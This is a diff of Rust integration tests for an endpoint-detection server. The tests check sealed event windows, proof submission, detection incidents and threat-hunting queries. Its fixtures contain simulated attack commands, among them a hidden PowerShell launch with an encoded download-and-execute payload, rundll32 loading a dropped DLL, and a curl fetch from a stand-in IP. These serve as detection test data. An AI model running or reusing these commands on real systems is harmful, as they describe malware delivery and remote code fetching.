@@ -5,7 +5,18 @@ use axum::{
 use ed25519_dalek::{Signer, SigningKey, Verifier};
 use sha2::Digest;
 use sqlx::sqlite::{SqlitePool, SqlitePoolOptions};
+use std::collections::BTreeMap;
+use std::sync::Arc;
 use tower::ServiceExt;
+use zedr_control_server::hunt::Described;
+use zedr_control_server::proofs::{ReceiptVerifier, Verified};
+use zedr_ledger::{leaf, seal, Hash, WindowHeader, GENESIS};
+use zedr_protocol::{
+    bytes_to_base64, hash_to_hex, FileAction, FileEvent, InventoryAction, NetworkAction, NetworkEvent, Opening, PackageEvent, PackageManager, PersistenceEvent, PersistenceKind,
+    ProcessAction, ProcessEvent, ProofSubmission, Release, SealedEvent, SealedWindow, SealedWindowHeader, SensorEvent, SystemEvent,
+};
+use zedr_rules::proof::{Committed, Input, Journal, WindowInput, JOURNAL_VERSION};
+use zedr_rules::State;
 
 async fn create_test_db() -> SqlitePool {
     let pool = SqlitePoolOptions::new()
@@ -39,6 +50,7 @@ const TEST_JWT_SECRET: &str = "test-secret-key-for-testing-purposes-only";
 const TEST_SIGNING_KEY_HEX: &str = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
 
 const TEST_SERVER_URL: &str = "https://localhost:8443";
+const TEST_GUEST_IMAGE_ID: &str = "abababababababababababababababababababababababababababababababab";
 const AGENT_CODE_BEFORE_KEY_SLOT: &[u8] = b"_agent_code_";
 
 fn agent_template(with_key_slot: bool) -> Vec<u8> {
@@ -74,6 +86,7 @@ fn set_test_env() {
     std::env::set_var("ZEDR_SERVER_URL", TEST_SERVER_URL);
     std::env::set_var("ZEDR_SIGNING_KEY_HEX", TEST_SIGNING_KEY_HEX);
     std::env::set_var("ZEDR_BINARIES_DIR", test_binaries_dir());
+    std::env::set_var("ZEDR_GUEST_IMAGE_IDS", TEST_GUEST_IMAGE_ID);
 }
 
 async fn download_agent(app: &axum::Router, platform: &str, install_key: &str) -> (StatusCode, Vec<u8>) {
@@ -539,6 +552,9 @@ async fn test_unauthorized_access_blocked() {
         "/api/admin/agents",
         "/api/admin/events",
         "/api/admin/installers",
+        "/api/admin/agents/some-agent/chain",
+        "/api/admin/agents/some-agent/windows/0",
+        "/api/admin/ruleset",
     ];
     
     for endpoint in admin_endpoints {
@@ -563,36 +579,42 @@ async fn test_unauthorized_access_blocked() {
 }
 
 #[tokio::test]
-async fn test_event_ingestion_accepts_valid_events() {
+async fn test_event_ingestion_refuses_sensor_events_and_still_accepts_heartbeats() {
     let (app, pool) = create_test_app_with_pool().await;
     let mut agent = enroll(&app, &pool, "test-agent-id").await;
+    let stored = |event_type: &'static str| {
+        let pool = pool.clone();
+        async move {
+            sqlx::query_scalar::<_, i64>("SELECT COUNT(*) FROM events WHERE agent_id = 'test-agent-id' AND event_type = ?")
+                .bind(event_type)
+                .fetch_one(&pool)
+                .await
+                .unwrap()
+        }
+    };
 
-    let body = agent.batch(serde_json::json!([
-        {
-            "Process": {
-                "timestamp": 1640995200,
-                "pid": 1234,
-                "ppid": 1000,
-                "executable_path": "/usr/bin/test",
-                "command_line": ["test", "--arg"],
-                "action": "Create",
-                "uid": 1000,
-                "hash": null
-            }
-        },
-        { "Heartbeat": { "timestamp": 1640995200 } }
-    ]));
+    let sensed = [
+        started(1640995200, 1234, 1000, "/usr/bin/test", &["--arg"]),
+        connected(1640995200, 1234, 443),
+        wrote(1640995200, 1234, "/tmp/out"),
+        autostart(InventoryAction::Added, PersistenceKind::Cron, "job", "/etc/cron.d/job", "true", None),
+        package(InventoryAction::Present, PackageManager::Dpkg, "openssl", "3.0.13-0ubuntu3", None),
+    ];
+    for event in sensed {
+        let body = agent.batch(serde_json::json!([{ "Heartbeat": { "timestamp": 1640995200 } }, SystemEvent::from(event)]));
+        let (status, _) = send_signed(&app, &agent, "/api/events", body).await;
+        assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY);
+    }
+    for event_type in ["process", "network", "file", "persistence", "package", "heartbeat"] {
+        assert_eq!(stored(event_type).await, 0, "nothing of a refused batch is stored, not even its {}", event_type);
+    }
+    assert!(tables_holding(&pool, "/usr/bin/test").await.is_empty());
+
+    let body = agent.heartbeat();
     let (status, json) = send_signed(&app, &agent, "/api/events", body).await;
-
-    assert_eq!(status, StatusCode::OK);
+    assert_eq!(status, StatusCode::OK, "a refused batch does not put the agent out of sequence");
     assert_eq!(json["upgrade"], serde_json::Value::Null);
-
-    let stored: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM events WHERE agent_id = ? AND event_type = 'process'")
-        .bind("test-agent-id")
-        .fetch_one(&pool)
-        .await
-        .unwrap();
-    assert_eq!(stored, 1);
+    assert_eq!(stored("heartbeat").await, 1);
 }
 
 #[tokio::test]
@@ -1599,6 +1621,7 @@ fn app_with_allowlist(pool: SqlitePool, allowlist: &str, peer: Option<&str>) -> 
     let options = zedr_control_server::api::RouterOptions {
         operator_allowlist: zedr_control_server::api::middleware::parse_operator_allowlist(allowlist).unwrap(),
         frontend_dist: None,
+        receipt_verifier: None,
     };
     let app = zedr_control_server::api::create_router_with_options(pool, options);
     match peer {
@@ -1645,6 +1668,12 @@ async fn test_agents_reach_the_server_from_outside_the_allowlist() {
     let body = agent.heartbeat();
     let (status, _) = send_signed(&outside, &agent, "/api/events", body).await;
     assert_eq!(status, StatusCode::OK);
+
+    let ledger = TestLedger::of(&agent);
+    let mut remote = Endpoint { agent, ledger };
+    remote.deliver(&outside, &[quiet(1)]).await;
+    let (status, _) = remote.submit(&outside, b"no receipt").await;
+    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "a proof reaches the server too, and this one is refused for what it is");
 }
 
 #[tokio::test]
@@ -1658,6 +1687,7 @@ async fn test_console_is_served_with_spa_fallback_and_unknown_api_paths_404() {
     let options = zedr_control_server::api::RouterOptions {
         operator_allowlist: Vec::new(),
         frontend_dist: Some(dist.clone()),
+        receipt_verifier: None,
     };
     let app = zedr_control_server::api::create_router_with_options(create_test_db().await, options);
 
@@ -2456,36 +2486,347 @@ async fn test_the_last_sign_in_is_recorded() {
     assert!(last_sign_in(&users).is_i64());
 }
 
-fn started(timestamp: u64, pid: u32, ppid: u32, path: &str, args: &[&str]) -> serde_json::Value {
+fn started(timestamp: u64, pid: u32, ppid: u32, path: &str, args: &[&str]) -> SensorEvent {
     let mut command_line = vec![path.to_string()];
     command_line.extend(args.iter().map(|arg| arg.to_string()));
-    serde_json::json!({ "Process": {
-        "timestamp": timestamp, "pid": pid, "ppid": ppid, "executable_path": path,
-        "command_line": command_line, "action": "Create", "uid": 1001, "hash": null
-    } })
+    SensorEvent::Process(ProcessEvent { timestamp, pid, ppid, executable_path: path.to_string(), command_line, action: ProcessAction::Create, uid: 1001, hash: None })
 }
 
-fn connected(timestamp: u64, pid: u32, port: u16) -> serde_json::Value {
-    serde_json::json!({ "Network": {
-        "timestamp": timestamp, "pid": pid, "process_path": "", "protocol": "tcp", "source_ip": "10.0.0.5", "source_port": 50123,
-        "dest_ip": "203.0.113.47", "dest_port": port, "action": "Connect", "bytes_sent": 1200, "bytes_received": 184000
-    } })
+fn quiet(pid: u32) -> SensorEvent {
+    started(u64::from(pid), pid, 1, "/usr/bin/sleep", &["60"])
 }
 
-fn dropper_chain() -> serde_json::Value {
-    serde_json::json!([
+fn connected(timestamp: u64, pid: u32, port: u16) -> SensorEvent {
+    SensorEvent::Network(NetworkEvent {
+        timestamp,
+        pid,
+        process_path: String::new(),
+        protocol: "tcp".to_string(),
+        source_ip: "10.0.0.5".to_string(),
+        source_port: 50123,
+        dest_ip: "203.0.113.47".to_string(),
+        dest_port: port,
+        action: NetworkAction::Connect,
+        bytes_sent: 1200,
+        bytes_received: 184000,
+    })
+}
+
+fn wrote(timestamp: u64, pid: u32, path: &str) -> SensorEvent {
+    SensorEvent::File(FileEvent { timestamp, path: path.to_string(), action: FileAction::Write, pid, process_path: String::new(), hash: None })
+}
+
+fn autostart(action: InventoryAction, kind: PersistenceKind, name: &str, path: &str, command: &str, hash: Option<&str>) -> SensorEvent {
+    SensorEvent::Persistence(PersistenceEvent {
+        timestamp: 1794780000,
+        action,
+        kind,
+        name: name.to_string(),
+        path: path.to_string(),
+        command: command.to_string(),
+        user: "root".to_string(),
+        enabled: true,
+        hash: hash.map(str::to_string),
+    })
+}
+
+fn package(action: InventoryAction, manager: PackageManager, name: &str, version: &str, previous_version: Option<&str>) -> SensorEvent {
+    SensorEvent::Package(PackageEvent {
+        timestamp: 1794780000,
+        action,
+        manager,
+        name: name.to_string(),
+        version: version.to_string(),
+        architecture: "amd64".to_string(),
+        previous_version: previous_version.map(str::to_string),
+    })
+}
+
+fn dropper_chain() -> Vec<SensorEvent> {
+    vec![
         started(100, 2596, 2568, "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", &[]),
         started(200, 2600, 2596, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", &["-nop", "-w", "hidden", "-enc", "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"]),
         connected(203, 2600, 443),
-        { "File": { "timestamp": 205, "path": "C:\\Users\\Public\\update.dll", "action": "Write", "pid": 2600, "process_path": "", "hash": null } },
+        wrote(205, 2600, "C:\\Users\\Public\\update.dll"),
         started(208, 2604, 2600, "C:\\Windows\\System32\\rundll32.exe", &["C:\\Users\\Public\\update.dll,Start"]),
         connected(212, 2604, 8443),
-    ])
+    ]
 }
 
-async fn ingest(app: &axum::Router, agent: &mut TestAgent, events: serde_json::Value) -> StatusCode {
-    let body = agent.batch(events);
-    send_signed(app, agent, "/api/events", body).await.0
+/// The form the server stores an opened event in
+fn stored_form(event: &SensorEvent) -> serde_json::Value {
+    let tagged = serde_json::to_value(SystemEvent::from(event.clone())).unwrap();
+    tagged.as_object().unwrap().values().next().unwrap().clone()
+}
+
+/// The sealing half of an agent: it commits to every event, seals it, runs the rules over it, and keeps what a proof needs
+#[derive(Clone)]
+struct TestLedger {
+    agent: Hash,
+    master: Hash,
+    epoch: u64,
+    next_window: u64,
+    next_index: u64,
+    head: Hash,
+    fresh: bool,
+    state: State,
+    seeds: BTreeMap<u64, Hash>,
+    kept: Vec<(WindowHeader, Vec<Vec<u8>>)>,
+    proven: usize,
+    proven_state: State,
+}
+
+impl TestLedger {
+    fn of(agent: &TestAgent) -> Self {
+        TestLedger {
+            agent: sha2::Sha256::digest(agent.key.verifying_key().to_bytes()).into(),
+            master: sha2::Sha256::digest(agent.key.to_bytes()).into(),
+            epoch: 1,
+            next_window: 0,
+            next_index: 0,
+            head: GENESIS,
+            fresh: true,
+            state: State::default(),
+            seeds: BTreeMap::new(),
+            kept: Vec::new(),
+            proven: 0,
+            proven_state: State::default(),
+        }
+    }
+
+    fn restart(&mut self) {
+        self.epoch += 1;
+        self.fresh = true;
+        self.state = State::default();
+    }
+
+    fn opening(&self, index: u64) -> Opening {
+        Opening { index, seed: hash_to_hex(&self.seeds[&index]) }
+    }
+
+    fn seal(&mut self, events: &[SensorEvent]) -> SealedWindow {
+        self.seal_marked(events, false)
+    }
+
+    fn seal_marked(&mut self, events: &[SensorEvent], gap: bool) -> SealedWindow {
+        let mut leaves = Vec::new();
+        let mut sealed = Vec::new();
+        let mut plain = Vec::new();
+        let mut releases = Vec::new();
+        for (index, event) in (self.next_index..).zip(events) {
+            let bytes = event.to_bytes();
+            let seed = seal::seed(&self.master, &self.agent, self.epoch, index, &bytes);
+            leaves.push(leaf(&self.agent, self.epoch, index, &seal::blind(&seed), &bytes));
+            sealed.push(seal::seal(&seed, &self.agent, self.epoch, index, &bytes).unwrap());
+            self.seeds.insert(index, seed);
+            for found in self.state.observe(index, event) {
+                releases.push(Release {
+                    trigger: found.trigger,
+                    rule: found.rule.id().to_string(),
+                    context: found.context.clone(),
+                    pid: found.pid,
+                    started_at: found.started_at,
+                    openings: found.opened().map(|opened| self.opening(opened)).collect(),
+                });
+            }
+            plain.push(bytes);
+        }
+
+        let header = WindowHeader::seal(&self.agent, self.epoch, self.next_window, self.next_index, self.fresh, gap, self.head, &leaves).unwrap();
+        self.next_window += 1;
+        self.next_index = header.next_index();
+        self.head = header.head;
+        self.fresh = false;
+        self.kept.push((header.clone(), plain));
+
+        SealedWindow {
+            agent_id: String::new(),
+            session: 0,
+            seq: 0,
+            header: SealedWindowHeader {
+                epoch: header.epoch,
+                window: header.window,
+                first_index: header.first_index,
+                count: header.count,
+                fresh: header.fresh,
+                gap: header.gap,
+                prev_head: hash_to_hex(&header.prev_head),
+                root: hash_to_hex(&header.root),
+                head: hash_to_hex(&header.head),
+            },
+            events: leaves.iter().zip(&sealed).map(|(leaf, sealed)| SealedEvent { leaf: hash_to_hex(leaf), sealed: bytes_to_base64(sealed) }).collect(),
+            releases,
+            proving: true,
+        }
+    }
+
+    /// The journal of a proof over the next windows that have none, computed the way an endpoint knows what its proof will say
+    fn journal(&mut self, windows: usize) -> Journal {
+        let run = &self.kept[self.proven..self.proven + windows];
+        let (first, last) = (&run[0].0, &run[windows - 1].0);
+        let input = Input {
+            agent: self.agent,
+            epoch: first.epoch,
+            fresh: first.fresh,
+            head_in: first.prev_head,
+            state: if first.fresh { State::default() } else { self.proven_state.clone() },
+            salt_in: seal::salt(&self.master, &self.agent, first.window),
+            salt_out: seal::salt(&self.master, &self.agent, last.window + 1),
+            windows: run
+                .iter()
+                .map(|(header, events)| WindowInput {
+                    window: header.window,
+                    first_index: header.first_index,
+                    gap: header.gap,
+                    events: (header.first_index..)
+                        .zip(events)
+                        .map(|(index, bytes)| Committed { blind: seal::blind(&seal::seed(&self.master, &self.agent, header.epoch, index, bytes)), event: bytes.clone() })
+                        .collect(),
+                })
+                .collect(),
+        };
+
+        let (journal, state) = zedr_rules::proof::run(input).unwrap();
+        self.proven += windows;
+        self.proven_state = state;
+        journal
+    }
+}
+
+/// An enrolled agent with its ledger
+struct Endpoint {
+    agent: TestAgent,
+    ledger: TestLedger,
+}
+
+async fn enroll_endpoint(app: &axum::Router, pool: &SqlitePool, agent_id: &str) -> Endpoint {
+    let agent = enroll(app, pool, agent_id).await;
+    let ledger = TestLedger::of(&agent);
+    Endpoint { agent, ledger }
+}
+
+impl Endpoint {
+    fn restart(&mut self) {
+        self.agent.restart();
+        self.ledger.restart();
+    }
+
+    fn request(&mut self, mut window: SealedWindow) -> String {
+        self.agent.seq += 1;
+        window.agent_id = self.agent.id.clone();
+        window.session = self.agent.session;
+        window.seq = self.agent.seq;
+        serde_json::to_string(&window).unwrap()
+    }
+
+    async fn send(&mut self, app: &axum::Router, window: SealedWindow) -> (StatusCode, serde_json::Value) {
+        let body = self.request(window);
+        send_signed(app, &self.agent, "/api/windows", body).await
+    }
+
+    async fn deliver(&mut self, app: &axum::Router, events: &[SensorEvent]) -> serde_json::Value {
+        let window = self.ledger.seal(events);
+        let (status, ack) = self.send(app, window).await;
+        assert_eq!(status, StatusCode::OK, "{}", ack);
+        ack
+    }
+
+    async fn submit(&mut self, app: &axum::Router, receipt: &[u8]) -> (StatusCode, serde_json::Value) {
+        self.agent.seq += 1;
+        let submission = ProofSubmission { agent_id: self.agent.id.clone(), session: self.agent.session, seq: self.agent.seq, receipt: bytes_to_base64(receipt) };
+        send_signed(app, &self.agent, "/api/proofs", serde_json::to_string(&submission).unwrap()).await
+    }
+
+    async fn prove(&mut self, app: &axum::Router, journal: &Journal) -> (StatusCode, serde_json::Value) {
+        self.submit(app, &journal.to_bytes()).await
+    }
+}
+
+const TEST_IMAGE_ID: Hash = [0x5a; 32];
+
+/// Stands in for the proof system: the receipt is the journal itself
+struct JournalAsReceipt;
+
+impl ReceiptVerifier for JournalAsReceipt {
+    fn verify(&self, receipt: &[u8]) -> Result<Verified, String> {
+        if receipt.is_empty() {
+            return Err("An empty receipt proves nothing".to_string());
+        }
+        Ok(Verified { image_id: TEST_IMAGE_ID, journal: receipt.to_vec() })
+    }
+
+    fn image_ids(&self) -> Vec<Hash> {
+        vec![TEST_IMAGE_ID]
+    }
+}
+
+async fn create_proving_app() -> (axum::Router, SqlitePool) {
+    set_test_env();
+    let pool = create_test_db().await;
+    let options = zedr_control_server::api::RouterOptions { receipt_verifier: Some(Arc::new(JournalAsReceipt)), ..Default::default() };
+    (zedr_control_server::api::create_router_with_options(pool.clone(), options), pool)
+}
+
+fn server_signed(answer: &serde_json::Value, bytes: &[u8]) -> bool {
+    let signature: Vec<u8> = answer["signature"].as_array().unwrap().iter().map(|byte| byte.as_u64().unwrap() as u8).collect();
+    test_deployment_key().verify(bytes, &ed25519_dalek::Signature::from_slice(&signature).unwrap()).is_ok()
+}
+
+async fn count(pool: &SqlitePool, sql: &str, agent_id: &str) -> i64 {
+    sqlx::query_scalar(sql).bind(agent_id).fetch_one(pool).await.unwrap()
+}
+
+async fn proof_states(pool: &SqlitePool, agent_id: &str) -> Vec<String> {
+    sqlx::query_scalar("SELECT proof FROM sealed_windows WHERE agent_id = ? ORDER BY window").bind(agent_id).fetch_all(pool).await.unwrap()
+}
+
+async fn findings(pool: &SqlitePool, agent_id: &str) -> Vec<serde_json::Value> {
+    sqlx::query_scalar::<_, String>("SELECT data FROM events WHERE agent_id = ? AND event_type = 'detection' ORDER BY rowid")
+        .bind(agent_id)
+        .fetch_all(pool)
+        .await
+        .unwrap()
+        .iter()
+        .map(|data| serde_json::from_str(data).unwrap())
+        .collect()
+}
+
+async fn incident_evidence(pool: &SqlitePool, agent_id: &str, incident_type: &str) -> serde_json::Value {
+    let evidence: String = sqlx::query_scalar("SELECT evidence FROM incidents WHERE agent_id = ? AND incident_type = ?")
+        .bind(agent_id)
+        .bind(incident_type)
+        .fetch_one(pool)
+        .await
+        .unwrap();
+    serde_json::from_str(&evidence).unwrap()
+}
+
+/// Every table and column that holds the text anywhere, read as raw bytes
+async fn tables_holding(pool: &SqlitePool, needle: &str) -> Vec<String> {
+    let tables: Vec<String> = sqlx::query_scalar("SELECT name FROM sqlite_master WHERE type = 'table'").fetch_all(pool).await.unwrap();
+    let mut holding = Vec::new();
+    for table in tables {
+        let columns: Vec<String> = sqlx::query_scalar("SELECT name FROM pragma_table_info(?)").bind(&table).fetch_all(pool).await.unwrap();
+        for column in columns {
+            let values: Vec<Vec<u8>> = sqlx::query_scalar(&format!("SELECT CAST(\"{column}\" AS BLOB) FROM \"{table}\" WHERE \"{column}\" IS NOT NULL")).fetch_all(pool).await.unwrap();
+            if values.iter().any(|value| value.windows(needle.len()).any(|window| window == needle.as_bytes())) {
+                holding.push(format!("{table}.{column}"));
+            }
+        }
+    }
+    holding.sort();
+    holding
+}
+
+/// Puts events into the hunt index the way the server does for an event that was opened on its own
+async fn index_opened(pool: &SqlitePool, agent_id: &str, events: &[SensorEvent]) {
+    for event in events {
+        let described = match event {
+            SensorEvent::Process(process) => Some(Described::new(process, None, process.timestamp)),
+            _ => None,
+        };
+        zedr_control_server::hunt::index(pool, agent_id, event, described.as_ref()).await.unwrap();
+    }
 }
 
 async fn detection_incidents(pool: &SqlitePool, agent_id: &str) -> Vec<String> {
@@ -2498,9 +2839,9 @@ async fn detection_incidents(pool: &SqlitePool, agent_id: &str) -> Vec<String> {
 #[tokio::test]
 async fn test_a_dropper_chain_opens_detection_incidents_with_evidence() {
     let (app, pool) = create_test_app_with_pool().await;
-    let mut agent = enroll(&app, &pool, "dropper-host").await;
+    let mut host = enroll_endpoint(&app, &pool, "dropper-host").await;
 
-    assert_eq!(ingest(&app, &mut agent, dropper_chain()).await, StatusCode::OK);
+    host.deliver(&app, &dropper_chain()).await;
 
     assert_eq!(
         detection_incidents(&pool, "dropper-host").await,
@@ -2529,42 +2870,51 @@ async fn test_a_dropper_chain_opens_detection_incidents_with_evidence() {
     assert_eq!(evidence["parent"], "winword.exe");
     assert_eq!(evidence["pid"], 2600);
     assert!(evidence["command"].as_str().unwrap().contains("-enc"));
+    assert_eq!((&evidence["trigger"], &evidence["window"], &evidence["proof"]), (&serde_json::json!(1), &serde_json::json!(0), &serde_json::json!("pending")));
+
+    let reached = findings(&pool, "dropper-host").await.into_iter().find(|finding| finding["rule"] == "proxy-network").unwrap();
+    assert_eq!(reached["subject"], "203.0.113.47:8443");
+    assert_eq!(reached["parent"], "powershell.exe");
+    assert!(reached["image"].as_str().unwrap().ends_with("rundll32.exe"));
 
     let (_, listed) = call(&app, "GET", "/api/admin/incidents?open=true", Some(&admin_token("user")), None).await;
     assert_eq!(listed.as_array().unwrap().iter().filter(|incident| incident["agent_id"] == "dropper-host").count(), 5);
 }
 
 #[tokio::test]
-async fn test_ordinary_activity_and_a_resent_process_list_open_nothing_new() {
+async fn test_ordinary_activity_and_the_same_findings_after_a_restart_open_nothing_new() {
     let (app, pool) = create_test_app_with_pool().await;
-    let mut agent = enroll(&app, &pool, "quiet-host").await;
+    let mut host = enroll_endpoint(&app, &pool, "quiet-host").await;
 
-    let ordinary = serde_json::json!([
+    let ordinary = [
         started(100, 700, 600, "C:\\BuildAgent\\bin\\buildagent.exe", &[]),
         started(110, 704, 700, "C:\\Windows\\System32\\cmd.exe", &["/c", "npm", "ci"]),
         started(120, 708, 704, "C:\\Program Files\\nodejs\\node.exe", &["install.js"]),
         connected(121, 708, 443),
         started(130, 712, 700, "C:\\Python312\\python.exe", &["worker.py"]),
         connected(131, 712, 5432),
-    ]);
-    ingest(&app, &mut agent, ordinary).await;
+    ];
+    host.deliver(&app, &ordinary).await;
     assert!(detection_incidents(&pool, "quiet-host").await.is_empty());
-    let recorded: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM events WHERE agent_id = 'quiet-host' AND event_type = 'detection'").fetch_one(&pool).await.unwrap();
-    assert_eq!(recorded, 0);
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM events WHERE agent_id = ? AND event_type = 'detection'", "quiet-host").await, 0);
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM events WHERE agent_id = ? AND event_type IN ('process', 'network')", "quiet-host").await, 0, "nothing was opened");
 
-    ingest(&app, &mut agent, dropper_chain()).await;
-    ingest(&app, &mut agent, dropper_chain()).await;
-    let recorded: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM events WHERE agent_id = 'quiet-host' AND event_type = 'detection'").fetch_one(&pool).await.unwrap();
-    assert_eq!(recorded, 7, "a process list sent again does not repeat its findings");
-    let opened: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM incidents WHERE agent_id = 'quiet-host'").fetch_one(&pool).await.unwrap();
-    assert_eq!(opened, 5);
+    host.deliver(&app, &dropper_chain()).await;
+    sqlx::query("UPDATE incidents SET closed_at = opened_at WHERE agent_id = 'quiet-host'").execute(&pool).await.unwrap();
+
+    host.restart();
+    host.deliver(&app, &dropper_chain()).await;
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM events WHERE agent_id = ? AND event_type = 'detection'", "quiet-host").await, 7, "a process list seen again after a restart does not repeat its findings");
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM incidents WHERE agent_id = ?", "quiet-host").await, 5, "and opens no incident a second time, not even one that was closed");
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM releases WHERE agent_id = ?", "quiet-host").await, 14, "both releases are held, each for the proof of its own epoch");
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM releases WHERE agent_id = ? AND finding_event_id IS NOT NULL", "quiet-host").await, 7);
 }
 
 #[tokio::test]
 async fn test_an_admin_closes_an_incident_and_it_is_audited() {
     let (app, pool) = create_test_app_with_pool().await;
-    let mut agent = enroll(&app, &pool, "triaged-host").await;
-    ingest(&app, &mut agent, dropper_chain()).await;
+    let mut host = enroll_endpoint(&app, &pool, "triaged-host").await;
+    host.deliver(&app, &dropper_chain()).await;
     let id: String = sqlx::query_scalar("SELECT id FROM incidents WHERE agent_id = 'triaged-host' AND incident_type = 'detection.proxy-network'")
         .fetch_one(&pool)
         .await
@@ -2602,21 +2952,21 @@ async fn hunt_total(app: &axum::Router, query: &str) -> i64 {
 }
 
 #[tokio::test]
-async fn test_hunting_finds_a_process_tree_shape_on_every_endpoint_that_has_it() {
+async fn test_hunting_finds_a_process_tree_shape_on_every_endpoint_that_released_it() {
     let (app, pool) = create_test_app_with_pool().await;
-    let mut first = enroll(&app, &pool, "hunt-a").await;
-    let mut second = enroll(&app, &pool, "hunt-b").await;
-    let mut clean = enroll(&app, &pool, "hunt-clean").await;
-    ingest(&app, &mut first, dropper_chain()).await;
-    ingest(&app, &mut second, dropper_chain()).await;
-    let ordinary = serde_json::json!([
+    let mut first = enroll_endpoint(&app, &pool, "hunt-a").await;
+    let mut second = enroll_endpoint(&app, &pool, "hunt-b").await;
+    let mut clean = enroll_endpoint(&app, &pool, "hunt-clean").await;
+    first.deliver(&app, &dropper_chain()).await;
+    second.deliver(&app, &dropper_chain()).await;
+    let ordinary = [
         started(100, 700, 600, "C:\\BuildAgent\\bin\\buildagent.exe", &[]),
         started(110, 704, 700, "C:\\Windows\\System32\\cmd.exe", &["/c", "npm", "ci"]),
-    ]);
-    ingest(&app, &mut clean, ordinary).await;
+    ];
+    clean.deliver(&app, &ordinary).await;
 
     let reader = admin_token("user");
-    let shape = r#"process where name = "rundll32.exe" and parent.name = powershell.exe and grandparent.name = WINWORD.EXE"#;
+    let shape = r#"process where name = "rundll32.exe" and parent.name = powershell.exe and parent.path ~ "\system32\""#;
     let (status, result) = hunt(&app, Some(&reader), shape).await;
     assert_eq!(status, StatusCode::OK);
     assert_eq!(result["entity"], "process");
@@ -2640,9 +2990,11 @@ async fn test_hunting_finds_a_process_tree_shape_on_every_endpoint_that_has_it()
     assert_eq!(hunt_total(&app, r#"file where path ~ "\users\public" and process.name = powershell.exe"#).await, 2);
     assert_eq!(hunt_total(&app, "detection where level = high").await, 10);
     assert_eq!(hunt_total(&app, "detection where rule = hidden-window or rule = shell-network").await, 4);
-    assert_eq!(hunt_total(&app, "process where command ~ npm").await, 1);
-    assert_eq!(hunt_total(&app, "process where name = cmd.exe and not parent.name = buildagent.exe").await, 0);
     assert_eq!(hunt_total(&app, "process where pid >= 2600 and pid < 2700").await, 4);
+    assert_eq!(hunt_total(&app, "process where name = winword.exe and parent.name = explorer.exe").await, 0, "a parent that was only opened as context is known without its own parent");
+    assert_eq!(hunt_total(&app, "process where grandparent.name = winword.exe").await, 0, "nothing tells the server a grandparent any more");
+    assert_eq!(hunt_total(&app, "process where command ~ npm or name = cmd.exe or name = buildagent.exe").await, 0, "what no rule released cannot be hunted");
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM hunt_processes WHERE agent_id = ?", "hunt-clean").await, 0);
 
     let (status, _) = hunt(&app, None, shape).await;
     assert_eq!(status, StatusCode::UNAUTHORIZED);
@@ -2658,8 +3010,8 @@ async fn test_hunting_finds_a_process_tree_shape_on_every_endpoint_that_has_it()
 #[tokio::test]
 async fn test_a_hunt_query_that_cannot_be_read_says_why_and_runs_nothing() {
     let (app, pool) = create_test_app_with_pool().await;
-    let mut agent = enroll(&app, &pool, "hunt-safe").await;
-    ingest(&app, &mut agent, dropper_chain()).await;
+    let mut host = enroll_endpoint(&app, &pool, "hunt-safe").await;
+    host.deliver(&app, &dropper_chain()).await;
     let reader = admin_token("user");
 
     let (status, refused) = hunt(&app, Some(&reader), "process name = a").await;
@@ -2680,33 +3032,25 @@ async fn test_a_hunt_query_that_cannot_be_read_says_why_and_runs_nothing() {
 #[tokio::test]
 async fn test_hunting_knows_which_processes_have_ended() {
     let (app, pool) = create_test_app_with_pool().await;
-    let mut agent = enroll(&app, &pool, "hunt-ended").await;
-    let ended = serde_json::json!({ "Process": {
-        "timestamp": 900, "pid": 41, "ppid": 0, "executable_path": "", "command_line": [], "action": "Terminate", "uid": 0, "hash": null
-    } });
-    ingest(&app, &mut agent, serde_json::json!([started(800, 41, 1, "/usr/bin/curl", &["-s", "http://203.0.113.9/a"]), started(810, 42, 1, "/usr/bin/sleep", &["60"]), ended])).await;
+    enroll(&app, &pool, "hunt-ended").await;
+    let ended = SensorEvent::Process(ProcessEvent { timestamp: 900, pid: 41, ppid: 0, executable_path: String::new(), command_line: Vec::new(), action: ProcessAction::Terminate, uid: 0, hash: None });
+    index_opened(&pool, "hunt-ended", &[started(800, 41, 1, "/usr/bin/curl", &["-s", "http://203.0.113.9/a"]), started(810, 42, 1, "/usr/bin/sleep", &["60"]), ended]).await;
 
     assert_eq!(hunt_total(&app, "process where name = curl and running = false").await, 1);
     assert_eq!(hunt_total(&app, "process where name = curl and running = true").await, 0);
     assert_eq!(hunt_total(&app, "process where running = true").await, 1);
 }
 
-fn packages(events: &[serde_json::Value]) -> serde_json::Value {
-    serde_json::json!(events.iter().map(|event| serde_json::json!({ "Package": event })).collect::<Vec<_>>())
-}
-
 #[tokio::test]
 async fn test_hunting_finds_every_endpoint_with_an_old_version_of_a_package() {
     let (app, pool) = create_test_app_with_pool().await;
-    let mut old = enroll(&app, &pool, "package-old").await;
-    let mut patched = enroll(&app, &pool, "package-patched").await;
-    let mut alpine = enroll(&app, &pool, "package-alpine").await;
-    ingest(&app, &mut old, packages(&[
-        package_event("Present", "dpkg", "openssl", "3.0.13-0ubuntu3", None),
-        package_event("Present", "dpkg", "bash", "5.2.21-2ubuntu4", None),
-    ])).await;
-    ingest(&app, &mut patched, packages(&[package_event("Present", "dpkg", "openssl", "3.0.14-1", None)])).await;
-    ingest(&app, &mut alpine, packages(&[package_event("Present", "apk", "openssl", "3.0.9-r1", None)])).await;
+    for agent_id in ["package-old", "package-patched", "package-alpine"] {
+        enroll(&app, &pool, agent_id).await;
+    }
+    let dpkg = |action, name, version, previous| package(action, PackageManager::Dpkg, name, version, previous);
+    index_opened(&pool, "package-old", &[dpkg(InventoryAction::Present, "openssl", "3.0.13-0ubuntu3", None), dpkg(InventoryAction::Present, "bash", "5.2.21-2ubuntu4", None)]).await;
